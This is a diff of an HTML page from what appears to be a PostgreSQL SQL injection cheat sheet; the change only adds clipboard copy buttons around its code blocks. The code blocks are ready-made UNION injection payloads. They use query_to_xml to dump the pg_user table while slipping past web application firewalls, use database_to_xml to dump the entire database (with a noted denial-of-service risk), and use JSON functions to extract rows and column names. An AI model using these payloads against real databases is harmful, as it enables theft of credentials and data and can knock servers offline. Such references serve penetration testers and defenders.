@@ -443,30 +443,38 @@
 <h3 id="xml-functions">XML functions</h3>
 <h4 id="query_to_xml">query_to_xml</h4>
 <p>The following functions map the contents of relational tables to XML values:</p>
-<pre><code class="language-sql">query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)
+<div class="clipboard-content">  <pre><code class="language-sql">query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)
 table_to_xml(tbl regclass, nulls boolean, tableforest boolean, targetns text)
 cursor_to_xml(cursor refcursor, count int, nulls boolean, tableforest boolean, targetns text)
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)
+table_to_xml(tbl regclass, nulls boolean, tableforest boolean, targetns text)
+cursor_to_xml(cursor refcursor, count int, nulls boolean, tableforest boolean, targetns text)
+">    Copy  </button></div></div>
 <p>With <code>query_to_xml</code> you can bypass WAF and exfiltrate the query results in a
 single string:</p>
-<pre><code class="language-sql">... UNION SELECT '1', '2', query_to_xml('select * from pg_user', true, true, ''), '4', ...
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-sql">... UNION SELECT '1', '2', query_to_xml('select * from pg_user', true, true, ''), '4', ...
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="... UNION SELECT '1', '2', query_to_xml('select * from pg_user', true, true, ''), '4', ...
+">    Copy  </button></div></div>
 <h4 id="database_to_xml">database_to_xml</h4>
 <p>The following function may be available and returns the entire current database:</p>
-<pre><code class="language-sql">database_to_xml(nulls boolean, tableforest boolean, targetns text)
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-sql">database_to_xml(nulls boolean, tableforest boolean, targetns text)
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="database_to_xml(nulls boolean, tableforest boolean, targetns text)
+">    Copy  </button></div></div>
 <p>The exploitation is as follow. Be careful the process may timeout or DOS the
 server:</p>
-<pre><code class="language-sql">... UNION SELECT '1', '2', database_to_xml(true, true, ''), '4', ...
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-sql">... UNION SELECT '1', '2', database_to_xml(true, true, ''), '4', ...
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="... UNION SELECT '1', '2', database_to_xml(true, true, ''), '4', ...
+">    Copy  </button></div></div>
 <h3 id="json-functions">JSON functions</h3>
 <p>PostgreSQL implements JSON functions to interact with this data structure.</p>
 <h3 id="to_jsonb-extract-line-as-a-json-object">to_jsonb - extract line as a JSON object</h3>
-<pre><code class="language-sql">SELECT to_jsonb(t.*) FROM my_table t;
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-sql">SELECT to_jsonb(t.*) FROM my_table t;
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="SELECT to_jsonb(t.*) FROM my_table t;
+">    Copy  </button></div></div>
 <h3 id="jsonb_object_keys-extract-columns-names">jsonb_object_keys - extract columns names</h3>
-<pre><code class="language-sql">SELECT jsonb_object_keys((SELECT to_jsonb(t.*) FROM my_table t LIMIT 1));
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-sql">SELECT jsonb_object_keys((SELECT to_jsonb(t.*) FROM my_table t LIMIT 1));
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="SELECT jsonb_object_keys((SELECT to_jsonb(t.*) FROM my_table t LIMIT 1));
+">    Copy  </button></div></div>
             
           </div>
           <footer>
